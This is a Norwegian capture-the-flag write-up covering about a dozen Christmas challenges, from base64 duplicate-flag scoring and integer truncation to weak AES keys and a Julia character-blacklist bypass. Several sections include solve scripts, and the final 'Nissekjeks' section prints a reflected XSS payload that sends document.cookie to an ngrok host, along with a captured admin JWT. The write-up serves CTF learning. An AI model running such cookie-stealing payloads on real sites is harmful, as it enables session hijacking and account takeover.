# Cyberlandslaget

## Hoarding

### Analyse

Her er en forenkling av hva som skjer når koden sjekker flaggene:

```py

# Flagg er base64, dekodet er flagg i klartekst:
flagg, dekodet = filtrert_flagg, b64decode(filtrert_flagg)


# Sjekker om flagget er et gyldig flagg
if dekodet not in FLAGG:
    return "Flagget er feil."


# Sjekk om flagget allerede er sendt inn
if flagg in database
    return "Flagget er allerede innsendt."


# Lagre flagget i databasen
database.add(flagg)


# Del ut poeng
lag.poeng += 10
```


### Løsning

Ettersom koden sjekker at det er de enkodede flaggene som må være ulike kan vi submitte flere varianter av det samme flagget for å score flere poeng.

Vi utnytter at e streng kan svare til flere ulike varianter i base64. Både `a30`, `a31`, `a32`, `a33` blir `k}` når vi dekoder det.

```py
import requests


# Target URL
url = "https://userspecific-hoarding.julew.tf/submit"


# List of different payloads to be sent
payloads = [
    {"lagnavn": "bootplug", "base64_flagg": "SlVMe3cwd19kdV8zcl9mbDFua30"},
    {"lagnavn": "bootplug", "base64_flagg": "SlVMe3cwd19kdV8zcl9mbDFua31"},
    {"lagnavn": "bootplug", "base64_flagg": "SlVMe3cwd19kdV8zcl9mbDFua32"},
    {"lagnavn": "bootplug", "base64_flagg": "SlVMe3cwd19kdV8zcl9mbDFua33"},
    {"lagnavn": "bootplug", "base64_flagg": "SlVMe2VuZGFfZW5fUlNBX29wcGdhdmU/P30"},
    {"lagnavn": "bootplug", "base64_flagg": "SlVMe2VuZGFfZW5fUlNBX29wcGdhdmU/P31"},
    {"lagnavn": "bootplug", "base64_flagg": "SlVMe2VuZGFfZW5fUlNBX29wcGdhdmU/P32"},
    {"lagnavn": "bootplug", "base64_flagg": "SlVMe2VuZGFfZW5fUlNBX29wcGdhdmU/P33"}
]


# Loop through each payload and send it to the server
for payload in payloads:
    response = requests.post(url, json=payload)
    print(f"Response Body: {response.text}")
```

<details>
<summary>Flagg</summary>

`JUL{f8ae29c6dd027fb9025416671ffb566e}`
</details>



## thegame

### Analyse

Vi blir satt i et spill med oppgavetekst som forklarer at spillet er "litt for vanskelig å faktisk spille". Det hinter oss om at vi kanskje må jukse for å vinne spillet.


### Løsning

Det første problemet jeg møter på er at det er vanskelig å komme forbi monstrene på spillbrettet fordi de beveger seg veldig kjapt.

Det løser jeg enkelt ved å sette `speed` på monstrene til 0. Da står de helt stille og er enkle å omgå.

Nå utforsker jeg spillebrettet til jeg finner en usynelig vegg. For å passere veggen forsøker jeg å finne den i koden slik at jeg kan fjerne den. Men ettersom det er mange tusen linjer kode, og vi får alt for mange resultater når jeg søker på "wall" og ingenting resultater når jeg søker etter "invisible" forsøker jeg å finne en annen metode.

Jeg ønsker nå heller å fjerne collision mellom spiller og vegg, slik at vi kan passere. "collision" gir et par hundre resultater, men vi klarer derimot å søke etter "player" for så å finne collision:

```js
{
    pName: "obj_player",
    spriteIndex: 45,
    visible: true,
    parent: -100,
    spritemask: 45,
    CreateEvent: gml_Object_obj_player_Create_0,
    ObjAlarm0: gml_Object_obj_player_Alarm_0,
    StepBeginEvent: gml_Object_obj_player_Step_1,
    Key_A: gml_Object_obj_player_Keyboard_65,
    Key_W: gml_Object_obj_player_Keyboard_87,
    Key_D: gml_Object_obj_player_Keyboard_68,
    Key_S: gml_Object_obj_player_Keyboard_83,
    BroadcastMessageEvent: gml_Object_obj_player_Other_76,
    TriggerEvents: [],
    CollisionEvents: [5, gml_Object_obj_player_Collision_obj_collision_parent, 7, gml_Object_obj_player_Collision_obj_enemy_parent]
}
```

Fjerner vi alle collisionEvents fra listen kan spilleren bevege seg fritt rundt uten å bli hindret av vegger og objekter. Beveger vi oss helt nederst på kartet ser vi flagget i bakken.

Merk at oppgaven sier at flagget kun består av små bokstaver.

<details>
<summary>Flagg</summary>

`JUL{juksepave_etc}`
</details>



## Julepakkejakten

### Analyse

Vi blir gitt en tekstfil av ukjent filtype. ChatGPT sier at fila er en ZPL-fil (Zebra Printer Language). Derfor bruker jeg verktøyet [labelary](https://labelary.com/viewer.html) som kan rendre innholdet i fila til bilder. Det viser at bildet er pakkelapper addressert fra Cyberlandslaget til mange ulike personer. PÅ lappen er det også en QR-kode, og en stor strekkode.


### Løsning

Jeg scanner den første QR-koden og får verdien 240J. Scanner jeg neste får jeg verdien 2403. Derfor mistenker jeg at det er her koden ligger, så jeg scanner alle. Nå har vi en haug med ulike bokstaver og tegn. Sorterer vi tegnene etter verdien på strekkodene har vi plutselig funnet flagget:

| Barcode | QR |
|---|---|---|
| LB135196248NO | J |
| LB135196249NO | U |
| LB135196250NO | L |
| LB135196251NO | { |
| LB135196252NO | Z |
| LB135196253NO | 3 |
| LB135196254NO | b |
| LB135196255NO | r |
| LB135196256NO | 4 |
| LB135196257NO | _ |
| LB135196258NO | s |
| LB135196259NO | C |
| LB135196260NO | r |
| LB135196261NO | 1 |
| LB135196262NO | P |
| LB135196263NO | t |
| LB135196264NO | _ |
| LB135196265NO | t |
| LB135196266NO | 1 |
| LB135196267NO | L |
| LB135196268NO | _ |
| LB135196269NO | j |
| LB135196270NO | U |
| LB135196271NO | l |
| LB135196272NO | } |

Så der har vi flagget.

<details>
<summary>Flagg</summary>

`JUL{Z3br4_sCr1Pt_t1L_jUl}`
</details>



## Apestreker

### Analyse

Vi får utdelt en rekke med små float-tall, og et assemblyprogram som pakker ut tallene:

```s
pakk_ut:
    lodsd
    ror rax, 0x8
    lea edi, [offset bilde + eax]
    rol rax, 0x8
    stosb
    cmp esi, offset slutt
    jnz pakk_ut
```

Vi får også et hint som kan hjelpe oss med å tegne bildet:

```
Også glemt hvilket RGB format jeg brukte... mener jeg ble inspirert av den første norske F-35 skvadronen
```


### Løsning

Vi ønsker å bruke python, heller enn assembly for å løse oppgaven. Derfor starter vi med å bruke ChatGPT til å skrive et pythonscript som laster inn tallrekken og oversetter assemblykoden over. Vi ender nå opp med en liste med tall av 8 bits lengde.

For å tegne et bilde av listen ønsker jeg først å finne mulige størrelse for bildet.

Jeg teller at det er 256200 tall i listen. Vi kan nå [faktorisere](https://www.calculatorsoup.com/calculators/math/factors.php) og finne ut at de mest sansynlige størrelsene er en av disse:

```s
350 × 732
366 × 700
420 × 610
427 × 600
488 × 525
```

Vi kan nå lage en 2D-matrise av listen som symboliserer piksler på et bilde:

[
    [53, 23, 156, ...],
    [143, 6, 240, ...],
    [37, 100, 98, ...],
    ...
]

Men dette bildet er ikke enkodet rett. Derfor ser vi på hintet gitt i koden. Den første norske F-35-skvadronen er 332 Skvadron. Det hinter til at 8-bits verdien skal dekodes slik:

```s
156 = 1 0 0 1 1 1 0 0
        8  |  7  | 0
       Rød  Grønn  Blå
```

Vi får nå et bilde som gir oss flagget. Her er hele koden jeg brukte:

```py
import struct
from PIL import Image
import numpy as np


# Read and process the CSV data manually
lsb_list = []
with open('handout/bilde.s', 'r') as f:
    data = f.read().split("pakket_data: .float ")[1].split(',') # Get values


# Unpack like the asm (float -> 8bit int)
for value in data:
    num = float(value)
    binary = struct.unpack('!I', struct.pack('!f', num))[0]
    rotated_left = ((binary >> 8 | binary << (32 - 8)) << 8 | (binary >> 8 | binary << (32 - 8)) >> (32 - 8)) & 0xFFFFFFFF
    lsb = rotated_left & 0xFF
    lsb_list.append(lsb)


#  Convert to 332 RGB (8bit int -> r, g, b)
def lsb_to_rgb(lsb):
    red = (lsb >> 5) & 0x07
    green = (lsb >> 2) & 0x07
    blue = lsb & 0x03
    return ((red * 255) // 7, (green * 255) // 7, (blue * 255) // 3)


# Prepare image data (r, g, b -> array)
width, height = 600, 427 # Image dimentions
image_data = np.zeros((height, width, 3), dtype=np.uint8)
for idx, lsb in enumerate(lsb_list):
    image_data[idx // width, idx % width] = lsb_to_rgb(lsb)


# Create and display the image
image = Image.fromarray(image_data)
image.save('output.png')
```

Resultatet blir et bilde med flagget:

![ape og flagg](apestreker/images/output.png)


<details>
<summary>Flagg</summary>

`JUL{omg_a_monke_in_RGB332}`
</details>



## Julespråk

### Analyse

Koden ser ut til å være skrevet i python, der syntaxen er byttet ut med emojier. Bytter vi ut de åpenbare som komma mellom tallene, og klammeparenteser rundt listen lærer vi at koden kombilerer selv etter at vi har begynt å endre den.
Derfor kan vi dekodes emoji for emoji, og teste underveis for å vite at vi har satt inn riktig syntax for riktig emoji. 

### Løsning

De enkleste tegnene som kan fylles inn først er `,`, `(` & `)` og `=`. Så kommer variabler, som jeg kaller for list1 - list7, og forskjellige funksjoner med tilhørende `:`. For å finne resten var det å prøve og feile med ulike tegn og se på syntaxfeilen dersom koden ikke fungerte. Den ferdige, rekonstruerte koden blir slik:

```py
list1 = bytes([ ... ])
list2 = ([ ... ])
list3 = bytes([ ... ])
list4 = bytes([ ... ])
list5 = bytes([ ... ])
list6 = bytes([ ... ])
list7 = bytes([ ... ])

def xor(a, b):
    return bytes([ a[i] ^ b[i % len(b)] for i in range(len(a)) ])

def func2(a, b):
    return bytes([ b[i] for i in a ])

def func3(a, b):
    return bytes([ a[b[i]] for i in range(len(a)) ])

def sjekkflagg():
    userinput = input(xor(list5, list1).decode()).encode()
    if len(userinput) != len(list4): # 55
        return False

    userinput = xor(userinput, list1)
    userinput = func2(userinput, list2)
    userinput = func3(userinput, list3)
    
    if userinput == list4:
        return True
    return False

riktig = sjekkflagg()

if riktig:
    print(xor(list6, list1).decode()) # Flagget stemmer
else:
    print(xor(list7, list1).decode()) # Flagget er feil
```

Jeg ber ChatGPT reversere alle de ulike funksjonene, så tester ved å sette inn verdier fra bunnen og jobbe meg baklengs helt til jeg finner flagget. Her er alle løsningsstegene kombinert som finner flagget til slutt:

```py
iftest = list4

# bytes([183, 23, 103, 109, 136, 160, 23, 121, 170, 154, 147, 42, 63, 65, 245, 42, 118, 124, 113, 84, 175, 190, 80, 61, 250, 127, 131, 233, 178, 35, 196, 0, 84, 183, 103, 196, 132, 160, 102, 245, 241, 127, 149, 196, 165, 132, 233, 166, 109, 14, 219, 68, 10, 131, 245])

part3_list = [0] * (max(list3) + 1)
for i, index in enumerate(list3):
    part3_list[index] = iftest[i]
part3 = bytes(part3_list)

# bytes([160, 84, 178, 118, 103, 183, 149, 102, 63, 147, 250, 170, 23, 245, 132, 0, 42, 35, 124, 84, 196, 245, 65, 131, 175, 127, 154, 80, 61, 113, 219, 14, 190, 233, 165, 233, 68, 183, 121, 131, 196, 127, 109, 10, 23, 245, 132, 109, 42, 160, 136, 241, 196, 166, 103])

part2 = bytes([list2.index(byte) for byte in part3])

# bytes([53, 19, 202, 13, 213, 245, 192, 65, 194, 102, 139, 17, 180, 203, 153, 145, 26, 42, 234, 19, 201, 203, 205, 106, 255, 103, 142, 8, 18, 28, 173, 166, 12, 41, 235, 41, 221, 245, 195, 106, 201, 103, 149, 37, 180, 203, 153, 149, 26, 53, 228, 23, 201, 224, 213])

part1 = bytes([ part2[i] ^ list1[i % len(list1)] for i in range(len(part2)) ])

# b'JUL{... _spr\xc3\xa5k_som_ ...}'

userinput = part1.decode('utf-8')
```

<details>
<summary>Flagg</summary>

` JUL{nah_bruker_heller_et_språk_som_faktisk_er_lesbart}`
</details>



## ønskeliste

### Analyse

Vi blir gitt kildekode for en Discordbot vi kan interagere med. Funksjonene vi kan kjøre sendes gjennom en en binær C-kodefile for behandling. Derfor går tankene fort mot at vi skal utnytte en minnefeil eller overflow'e noe.

### Løsning

Feilen ligger i funksjonen som brukes for å justere prioritet på ønskene. Funksjonen kalles med brukerinput gjennom  python, og behandles i C:

Her er en forenkling av funksjonskallet i Python:

```py
@slash_command(name="juster_prioritet")
@slash_option(name="ny_prioritet")
async def juster_prioritet(ctx : SlashContext, ny_prioritet: int):
    onskeliste.justerØnskePrioritet(ny_prioritet)
```

Her er en forenklet visning av funksjonen i C:

```c
typedef struct {
    int prioritet;
} Ønske;

Ønske ønskeliste[500];

int justerØnskePrioritet(int64_t nyPrioritet) {

    // Sjekk om ny prioritet er lavere (mer viktig) enn nåværende
    if (nyPrioritet <= ønskeliste[i].prioritet) {
        printf("Feil: Ny prioritet må være lavere enn nåværende prioritet (%d).\n", ønskeliste[i].prioritet);
        return -2; // Ugyldig prioritet
    }

    // Oppdater brukerens prioritet
    ønskeliste[i].prioritet = nyPrioritet;

    printf("Prioriteten er oppdatert til %ld.\n", nyPrioritet);
    return 0; // Vellykket
}
```

Problemet ligger i at nyverdien legges i en int64_t (2^64) og den gamle ligger i en vanlig int (2^32). Det betyr at om vi skriver et tall over 2^32 vil tallet ansees som større når verdiene sammenlignes, men når vi dytter den nye verdien inn i den gamle vil den kuttes av, og kun lagre de 32 laveste bitene.

Derfor kan vi ønske oss prioritet 2^32 + 1 (4294967297) for å få prioritet 1.


<details>
<summary>Flagg</summary>

`JUL{sn1ll3_b4rn_sl3mm3_t4ll}`
</details>




## Ydmykt spill

### Analyse

Jeg tester først diverse lange inputs og andre tall enn 1 og 0, det gir ingen resultater. Derfor må oppgaven angripes som et logisk problem.

Derfor må vi finne en strategi ved å bruke tallene til motstanderen og slå han minst 62.5% av gangene.


### Løsning

Løsningen kan regnes ut med statistikk. For å øke sjansene kan vi kopiere de første 7 bitene fra motstanderens rekke. Her er et eksempel:

```
Motstander:  [ 0 1 0 1 0 0 1 0 ]
               ↓           ↓
Mitt valg: [ x 1 0 1 0 0 1 0 ]
```

På den måten vi vi ha en 50% sjanse for at hver gang motstanderen holder på å vinne, stjeler vi seieren fra han. Dette kombinert med at vår sjanse for å finne i utgangspunktet er 50% gir en total fordel til oss på 2:3 (66,66%).

For å sikre oss at den ikke feiler i edge case der alle tallene er rekken like kan vi sette det første tallet (x i eksempelet) til den inverterte av et av de andre tallene:

```py
from pwn import *

io = remote("ydmykt.julew.tf", 1337, ssl=True)

for i in range(100):
    # Hent siste 7 verdier
    io.recvuntil("=")    
    lst = eval(io.recvuntil("]"))[:7]

    # Sett inn første tegn
    if(lst[1]):
        lst.insert(0, 0)
    else:
        lst.insert(0, 1)
    
    # Send rekke
    io.sendlineafter(":", str(lst))

    # Vinnersjanse
    print( io.recvuntil("\n", drop=True).decode() )

io.interactive()
```

Problemet med denne metoden er at 100 spill ikke alltid gir høy nok vinnersjanse. Den kan være så lavt som til 57-58%. Derfor ønsker vi å regne ut hva som er det beste første tallet for hvert tall motstanderen har for å øke sjansene våre enda mer. Det kan gjøres ved å sette opp en løkke som tester og sammenligner hvilken av de to mulighetene 1 eller 2 som gir best odds:

```py
def get_best(seq):
    cpu = seq
    seq1 = "0" + seq[:-1]
    seq2 = "1" + seq[:-1]
    win1 = win2 = 0
    for _ in range(1000):
        game = ""
        while True:
            game += random.choice("01")
            game = game[-8:]
            if game == cpu:
                break
            elif game == seq1:
                win1 += 1
                break
            elif game == seq2:
                win2 += 1
                break
    return [seq1, seq2][win2>win1]
```

Koden over er hentet fra løsningsforslaget til UnblvR


<details>
<summary>Flagg</summary>

`JUL{https://www.youtube.com/watch?v=s4tyO4V2im8}`
</details>



## ordentlig julespråk

### Analyse

Vi blir gitt koden til en Julia-app, som krever at vi sender teksten "Jeg er snill og fortjener flagget fra nissen!", men den har svartelistet de fleste bokstaver, tall og tegn.

```py
ulovlig = [' ', '!', '"', '#', '$', '%', '&', "'", '+', ',', '-', '.', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@',
'A', 'B',      'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
'[', '\\', ']', '^', '_', '`',
     'b', 'c', 'd', 'e', 'f', 'g',      'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',      's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
'{', '|', '}', '~']

v = eval(input)
if v == "Jeg er snill og fortjener flagget fra nissen!"
    return flagg
```

### Løsning

Om vi ser igjennom listen finner vi ut at bokstavene `C`, `h`, `a`, `r`, `(` og `)` ikke er svartelistet. I Julia brukes `*` for å kombinere tekst, og denne er heller ikke svartelistet. Derfor mangler vi bare en måte å generere tall.

Tallene kan genereres på to måter:

boolske uttrykk, slik som `()≡()` gir true (1) som så kan settes sammen slik: `()≡()--()≡()` for å lage tallet 2 osv.

eller ved å bruke matematiske symboler, slik som `π` og `ℯ` (ikke e) og `÷` (integer division) for å gjøre at tallene kan brukes i Char(). Vi kan også bruke `√`, `∛` og `∜` for å optimalisere uttrykkene:

```py
import requests

pt = [74, 101, 103, 32, 101, 114, 32, 115, 110, 105, 108, 108, 32, 111, 103, 32, 102, 111, 114, 116, 106, 101, 110, 101, 114, 32, 102, 108, 97, 103, 103, 101, 116, 32, 102, 114, 97, 32, 110, 105, 115, 115, 101, 110, 33]

# Unique sorted by count: [32, 33, 101, 103, 97, 102, 105, 106, 108, 110, 111, 114, 115, 74, 116]

translation = {
    32: 'ℯ*ℯ*π√π÷√√ℯ',
    33: 'ℯ*ℯ*ℯ*ℯ÷√ℯ',
    74: 'π*ℯ*ℯ*ℯ√ℯ÷∛ℯ',
    97: 'π*π*π*π*π÷π',
    101: 'ℯ*ℯ*ℯ*ℯ*ℯ÷∛π',
    102: 'π*π∛π*π*π÷∛ℯ',
    103: 'π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ',
    105: 'π*π*π*π∛ℯ÷∜ℯ',
    106: 'ℯ*ℯ*ℯ*ℯ*ℯ÷∛ℯ',
    108: 'π*π*π*ℯ√ℯ÷∜ℯ',
    110: 'π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ',
    111: 'π*π*π*π∛π÷∜ℯ',
    114: 'ℯ*ℯ*π*π√π÷√√√ℯ',
    115: 'ℯ*ℯ*ℯ*ℯ*ℯ÷∜ℯ',
    116: 'π*π*π*ℯ√π÷∜ℯ'
}

code = ""
for value in pt:
    code += f"*Char({translation[value]})"

print(code[1:])

response = requests.get("http://localhost:8080/?input=" + code[1:])

if(response.text == "JUL{testflagg}"):
    print(f"Works and is: {len(code)}")
```

Koden blir:

```
Char(π*ℯ*ℯ*ℯ√ℯ÷∛ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(ℯ*ℯ*π*π√π÷√√√ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∜ℯ)*Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)*Char(π*π*π*π∛ℯ÷∜ℯ)*Char(π*π*π*ℯ√ℯ÷∜ℯ)*Char(π*π*π*ℯ√ℯ÷∜ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(π*π*π*π∛π÷∜ℯ)*Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(π*π∛π*π*π÷∛ℯ)*Char(π*π*π*π∛π÷∜ℯ)*Char(ℯ*ℯ*π*π√π÷√√√ℯ)*Char(π*π*π*ℯ√π÷∜ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(ℯ*ℯ*π*π√π÷√√√ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(π*π∛π*π*π÷∛ℯ)*Char(π*π*π*ℯ√ℯ÷∜ℯ)*Char(π*π*π*π*π÷π)*Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)*Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(π*π*π*ℯ√π÷∜ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(π*π∛π*π*π÷∛ℯ)*Char(ℯ*ℯ*π*π√π÷√√√ℯ)*Char(π*π*π*π*π÷π)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)*Char(π*π*π*π∛ℯ÷∜ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∜ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∜ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)*Char(ℯ*ℯ*ℯ*ℯ÷√ℯ)
```

<details>
<summary>Flagg</summary>

`JUL{14_3R_G0Y_4_PR0GR4M4R3_M3D}`
</details>



## Hangul AES

### Analyse

Vi ser umiddelbart at det er noe som stikker seg ut i koden. Hangulfiller-tegnet (`ㅤ`) ser ut som et mellomrom, men oppfører seg ikke som det. For å gjøre oppgaven vanskeligere er det laget plass til disse tegnene i alle funksjonen som kjøres:

Derfor kan det være vanskelig å skille mellom `os.urandom( 16, )` (mellomrom) og `krypter_melding( FLAG,ㅤ)` (Hangulfiller)

Det som er spesielt merkverdig er at Hangulfilleren her ikke er pakket inn i `"`, som tyder på at den ikke er en string, men at den symboliserer en variabel. Variablen må derfor være definert (enten statisk eller beregnet) i biblioteket `secret` som blir inkludert.

Det betyr også at `key` i denne funksjonen aldri vil bli regnet ut tilfeldig, fordi den er definert på forhånd:

```py
def krypter_melding( msg, key = None, ):
    if key == None:
        key = os.urandom( 16, )
```


### Løsning

For å knekke koden bassert på den innledende analysen ønsker vi å finne nøkkelen definert med Hangulfiller-tegnet slik at vi kan dekryptere flagget.

For å finne den utnytter jeg at vi kan dekryptere tekst med en nøkkel som ikke er så tilfeldig som et først ser ut:

```py
KEY = b'' . join( [ os.urandom( 1, ) ] * 16, )
```

Koden over vil nemlig regne ut en nøkkel med 16 identiske bytes, heller enn 16 ulike tilfeldige. Derfor trenger vi bare å teste 256 forskjellige nøkler for å klare å dekryptere vår egen tekst. Slik klarer vi å finne `msg` som er definert slik:

```py
msg = b''.join( [ msg, padding, ㅤ]) 
```

Jeg gjør dette et par ganger og lager en funksjon som kan skille ut den delen av msg som er lik i alle versjoner. Det er dette som er verdien til Hangulfilleren.

Det eneste som mangler nå er å dekryptere ciphertexten til flagget med denne som nøkkel.

Her er hele koden delt opp i steg:


```py
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import binascii


# Try all combinations until known plaintext is found, which implies the correct key
def try_keys(ct, known_pt_part):
    ct_bytes = bytes.fromhex(ct)
    
    for i in range(256):
        key = b'' . join( [ bytes([i]) ] * 16, )

        try:
            cipher = AES.new(key, AES.MODE_ECB)
            decrypted = unpad(cipher.decrypt(ct_bytes), AES.block_size)

            if known_pt_part in str(decrypted):
                return decrypted
        except:
            continue

def find_common_suffix(decoded_list):
    suffix = decoded_list[0]
    for item in decoded_list[1:]:
        new_suffix = []
        for i in range(1, min(len(suffix), len(item)) + 1):
            if suffix[-i:] == item[-i:]:
                new_suffix = suffix[-i:]
            else:
                break
        suffix = bytes(new_suffix)
    return suffix


# Connect to the server
r = remote('hangul.julew.tf', 1337, ssl=True)

decoded = []


# Find the key
for _ in range(10):
    r.sendlineafter(b">", b"1")
    r.sendline(b"kryptering")
    r.recvuntil(b"Din krypterte melding: ")
    ct = r.recvline().strip().decode()
    decoded.append(try_keys(ct, "kryptering"))
key = find_common_suffix(decoded)
print("Key found:", key)


# Get the ciphertext
r.sendlineafter(b">", b"2")
r.recvuntil(b"Din krypterte melding: ")
ct_hex = r.recvline().strip().decode()
ciphertext = binascii.unhexlify(ct_hex)



# Decrypt using AES ECB mode
cipher = AES.new(key, AES.MODE_ECB)
decrypted_data = cipher.decrypt(ciphertext)
print(decrypted_data)
```

<details>
<summary>Flagg</summary>

`JUL{Hangul_kan_gjemme_kode_hvis_kodestilen_er_stygg_nok}`
</details>



## Flaggmodell

### Analyse

I `tren_modell.py` trener en bildemodell som kan gjenkjenne bilder av flagg. Treningsprosessen innebærer å mate både flaggbilder og tilfeldig støy til modellen, beregne tapet, og oppdatere modellens parametere. Den trente modellen lagres til en fil. Her finner vi også reglene for hvordan bildene skal formateres:

```py
transform = transforms.Compose([
    transforms.Grayscale(num_output_channels=1),
    transforms.Resize((20, 358)),
    transforms.ToTensor()
])
```


### Løsning

For å løse problemet bruker vi A/B-testing på én og én piksel. Vi tester hver piksel som svart og hvit, og velger den fargen som modellen mener er mest sannsynlig å være en del av flagget. Dette gjør vi for alle pikslene i bildet:

```python
import torch
from PIL import Image
import torchvision.transforms as transforms
from handout.FlaggCNN import FlaggCNN

def predict_flag(image, model):
    # Preprocess the image and predict whether it's a flag
    transform = transforms.Compose([
        transforms.Grayscale(num_output_channels=1),
        transforms.Resize((20, 358)),
        transforms.ToTensor()
    ])
    image_tensor = transform(image).unsqueeze(0)
    with torch.no_grad():
        return torch.sigmoid(model(image_tensor)).item()

def create_image_with_model_prediction(model, width, height):
    image = Image.new("1", (width, height), 255)  # '1' for black and white image
    pixels = image.load()

    for i in range(width):
        for j in range(height):
            # Test the pixel as black vs white
            image_temp = image.copy()
            image_temp.putpixel((i, j), 0)  # Set to black
            prob_black = predict_flag(image_temp, model)

            image_temp.putpixel((i, j), 255)  # Set to white
            prob_white = predict_flag(image_temp, model)

            pixels[i, j] = 0 if prob_black > prob_white else 255  # Choose black or white

    return image

if __name__ == "__main__":
    pt_sti = "handout/flaggmodell.pt"
    model = FlaggCNN()
    model.load_state_dict(torch.load(pt_sti, map_location=torch.device('cpu'), weights_only=True))
    model.eval()

    # Create and save the image
    image = create_image_with_model_prediction(model, 358, 13)
    image.save("flagg.png")
```

Resultatet blir et bilde som inneholder flagget:

![flagg](flaggmodell/images/flagg.png)

<details>
<summary>Flagg</summary>

`JUL{hv0rf0r_bruke5_1kk3_pt_s0m_b1ld3f0rm4t}`
</details>



## Klarzmas

### Analyse

Vi blir gitt et spill som avslører én bokstav i flagget for hvert treff vi gjør. Men dessverre å har vi bare 15 skudd, som ikke er nok for å vise hele flagget.

Vedlagt exe-en ligger også en haug med .dlls, blant annet:

1. GodotSharp.dll
2. GoDotCheatHandler.dll
3. Klarzmas.dll (Klarzmas.deps.json, Klarzmas.pdb, Klarzmas.runtimeconfig.json)*


### Løsning

Mye av koden til spillet er fordelt over Klarzmas.dll og GoDotCheatHandler.dll. GoDotCheatHandler.dll blir kalt opp hver gang en ny bokstav skal vises. Derfor er denne veldig interessant å se på.

Vi kan bruke dotPeek for å dekompilere og lese dll-ene:

```cs
#nullable enable
namespace GoDotCheatHandler {
  public class AntiCheat {
    public static string CheatHandler(int mobKills) {

      if (mobKills > 15){
        return "CHEATER DETECTED";
      }
      
      int[] numArray = Array.ConvertAll<char, int>("KTMyq7t]Qd]Uh>dmmUh>dmUsk~>~k~k^UhxxUa>z:}w".ToCharArray(), (Converter<char, int>) (c => (int) c));
      
      for (int index = 0; index < mobKills; ++index) {
        int num1 = 10 % (index + 1);
        int num2 = num1 == 0 ? 1 : num1;
        numArray[index] ^= num2;
      }

      StringBuilder stringBuilder = new StringBuilder();
      
      for (int index = 0; index < mobKills; ++index){
        stringBuilder.Append((char) numArray[index]);
      }
      return stringBuilder.ToString();
    }
  }
}
```

Denne koden har en hard sjekk på at du ikke kan skyte flere enn 15 monstre. Det kan være for å forhindre at løsningen blir å gi seg selv flere skudd som enkelt kunne vært gjort med f.eks. CheatEngine.

Men om vi fjerner denne sjekken før koden kjører får vi etterhvert alle bokstavene i flagget:

<details>
<summary>Flagg</summary>

`JUL{p3w_PeW_b4ngg_b4ng_yat4tataT_brr_k4p0w}`
</details>



## Nissekjeks

### Analyse

Jeg møter først en side hvor jeg kan søke etter bilder:

![page 1](nissekjeks/images/Screenshot_39.png)

Her lærer jeg to ting, både at teksten jeg skriver inn reflekteres ufiltrert ut igjen, og jeg får opp et bilde som hinter til at det er flere sider på nettsiden:

![page 2](nissekjeks/images/image.png)


### Løsning

Jeg utnytter at siden for å søke etter bilder viser søketeksten på skjermen uten å filtrere den. Derfor bruker jeg reflektert XSS til å lage en lenke som stjeler cookiene til den som besøker siden.

XSS script (kan bruke ngrok, webhook, burp, osv.):

```html
<script>fetch("https://b7a3-92-220-16-80.ngrok-free.app/?"+document.cookie);</script>
```

URL julenissen kan besøke for å trigge scriptet:

```
https://_usercode_-nissekjeks.julew.tf/search?query=%3Cscript%3Efetch(%22https%3A%2F%2Fb7a3-92-220-16-80.ngrok-free.app%2F%3F%22%2Bdocument.cookie)%3B%3C%2Fscript%3E
```

Jeg får nå tilsendt julenissens (admins) cookies:

`access_token_cookie`: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNDk2MzM0NSwianRpIjoiOThmOWIzOTYtMzY1Yi00NjliLTlkMTktZDA4YTMyODUyMjVjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzM0OTYzMzQ1LCJleHAiOjE3MzQ5NjQyNDV9.s_7d8yAnbJCquEJAQk-ZFz-hWrCpagih2kUVxDjLWvc`

Jeg kan nå bruke denne når jeg besøker `https://_usercode_-nissekjeks.julew.tf/flag` for å hente ut flagget.

<details>
<summary>Flagg</summary>

`JUL{m3lk_0g_kj3ks_b3gr3ns3t_4ks3ss}`
</details>
